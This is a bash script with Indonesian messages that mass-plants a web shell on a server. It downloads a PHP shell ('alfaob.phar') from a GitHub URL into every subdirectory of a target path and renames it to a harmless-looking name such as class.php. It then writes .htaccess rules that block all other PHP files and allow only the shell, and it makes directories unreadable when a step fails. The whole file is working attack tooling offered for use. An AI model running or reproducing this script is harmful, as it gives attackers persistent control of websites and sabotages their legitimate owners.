#!/bin/bash

if [ -z "$1" ]; then
  echo "Penggunaan: bash ht.sh /path/to/directory"
  exit 1
fi

TARGET_DIR="$1"
PHP_URL="https://raw.githubusercontent.com/paylar/shell/refs/heads/main/alfaob.phar"

PHP_FILES=("wolv2.php" "class.php" "custom.php" "handler.php" "index-MAR.php" "NewClass.php")
if ! command -v curl &> /dev/null; then
    echo "curl tidak ditemukan, silakan install curl terlebih dahulu."
    exit 1
fi

find "$TARGET_DIR" -type d -print0 | while IFS= read -r -d '' DIR; do
    SELECTED_PHP_FILE="${PHP_FILES[$RANDOM % ${#PHP_FILES[@]}]}"

    TEMP_FILE="$DIR/alfaob.phar"
    curl -s -o "$TEMP_FILE" "$PHP_URL"
    if [ $? -ne 0 ] || [ ! -f "$TEMP_FILE" ]; then
        echo "Gagal mendownload file ke $DIR"
        chmod 0000 "$DIR"
        continue
    fi

    mv "$TEMP_FILE" "$DIR/$SELECTED_PHP_FILE"
    if [ $? -ne 0 ]; then
        echo "Gagal mengubah nama file di $DIR"
        chmod 0000 "$DIR"
        continue
    fi

    chmod 644 "$DIR/$SELECTED_PHP_FILE"
    HTACCESS_CONTENT=$(cat <<EOL
<Files *.ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.a*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.S*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.pH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.PH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.s*>
    Order Deny,Allow
    Deny from all
</Files>

<FilesMatch "\\.(jpg|pdf|docx|jpeg|)\$">
    Order Deny,Allow
    Allow from all
</FilesMatch>

<FilesMatch "^(index.html|index-MAR.php|${SELECTED_PHP_FILE})\$">
    Order allow,deny
    Allow from all
</FilesMatch>

DirectoryIndex index.html
Options -Indexes
ErrorDocument 403 "403 Forbidden"
ErrorDocument 404 "403 Forbidden"
EOL
)

    echo "$HTACCESS_CONTENT" > "$DIR/.htaccess"
    if [ $? -ne 0 ]; then
        echo "Gagal menulis .htaccess di $DIR"
        chmod 0000 "$DIR"
    fi
done
